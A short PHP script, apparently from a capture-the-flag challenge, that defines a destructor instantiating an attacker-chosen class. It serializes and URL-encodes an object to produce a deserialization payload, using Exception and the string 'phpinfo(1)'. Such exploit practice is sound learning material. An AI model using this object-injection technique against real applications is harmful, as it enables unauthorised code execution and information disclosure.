<?php
highlight_file(__FILE__);

class A
{
    public $a;
    public $b;

    public function __destruct()
    {
        echo new $this->a($this->b);
    }
}

$exp=new A();
$exp->a="Exception";
$exp->b="phpinfo(1)";
echo(urlencode(serialize($exp)));
throw new Exception('can can need new new');